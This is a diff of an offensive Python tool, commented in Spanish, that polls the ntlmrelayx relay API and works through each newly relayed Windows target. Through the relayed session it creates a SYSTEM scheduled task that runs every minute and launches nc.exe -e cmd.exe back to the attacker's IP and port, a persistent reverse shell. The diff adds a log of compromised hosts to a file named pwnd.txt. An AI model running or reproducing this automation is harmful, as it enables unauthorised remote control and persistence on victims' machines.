@@ -57,7 +57,13 @@ class targetRelay:
         comandos = [         
                     f"{self.connection} -x "  + "'" + 'schtasks /create /sc minute /mo 1 /tn "AutoRelay2" /tr "cmd.exe /C C:\\Windows\\' + CARPETA_OBJETIVO + '\\nc.exe -e C:\Windows\System32\cmd.exe ' + f"{LOCAL_IP} {self.port}" + '" /ru SYSTEM /f'+ "'",
         ]
-        
+        # Abrir el archivo en modo de adjuntar ('a' significa append)
+        with open('pwnd.txt', 'a') as archivo:
+            # Escribir contenido adicional en el archivo
+            archivo.write(f"{self.ip}  {self.port}\n")
+
+
+
         for comando in comandos:
             p = os.popen(comando)
 
@@ -77,29 +83,35 @@ class targetRelay:
 # Define la URL a la que se realizará la solicitud GET.
 url = "http://localhost:9090/ntlmrelayx/api/v1.0/relays"
 
-try:
-    # Realiza una solicitud GET a la URL especificada.
-    response = requests.get(url)
 
-except requests.exceptions.ConnectionError as e:
-        print(f"Error de conexión: {e}")
     
 
 
 target_json = ""
+i = 0 
 
 # Comprueba si el código de estado de la respuesta es igual a 200 (éxito).
 
 targets_pwnd = []
 
+with open('pwnd.txt', 'a') as archivo:
+    # Escribir contenido adicional en el archivo
+    archivo.write("---------------------------------------------\n")
+
 while True:
+    try:
+        # Realiza una solicitud GET a la URL especificada.
+        response = requests.get(url)
+    except requests.exceptions.ConnectionError as e:
+        print(f"Error de conexión: {e}")
+
     try:
         if response.status_code == 200:
             print(response.json())
 
             data = response.json()
 
-            i = 0    
+               
             for item in data:
 
                 if item[1] not in targets_pwnd:
@@ -108,7 +120,7 @@ while True:
                             if item[1] not in targets_pwnd:
                                 targets_pwnd.append(item[1])
                             
-                            i = i + 1
+                            i += 1
 
                             target_json = targetRelay(item[1], item[2], i)
                             
